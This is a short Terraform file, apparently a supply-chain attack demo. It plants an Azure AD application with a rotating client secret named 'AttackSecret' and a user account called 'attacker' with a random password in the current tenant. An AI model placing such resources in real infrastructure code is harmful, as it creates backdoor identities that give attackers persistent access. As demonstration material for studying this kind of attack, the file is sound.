data "azuread_client_config" "current" {}

resource "time_rotating" "attack_secret" {
  rotation_days = 180
}

resource "azuread_application" "attack" {
  display_name = "TerraformSupplyChainAttackDemo"
  owners       = [data.azuread_client_config.current.object_id]

  password {
    display_name = "AttackSecret"
    start_date   = time_rotating.attack_secret.id
    end_date     = timeadd(time_rotating.attack_secret.id, "4320h")
  }
}

data "azuread_domains" "aad_domains" {
  only_default = true
}

resource "random_password" "attacker" {
  length  = 16
  special = true
}

resource "azuread_user" "attacker" {
  user_principal_name = "attacker@${data.azuread_domains.aad_domains.domains[0].domain_name}"
  display_name        = "Attacker"
  mail_nickname       = "attacker"
  password            = random_password.attacker.result
}
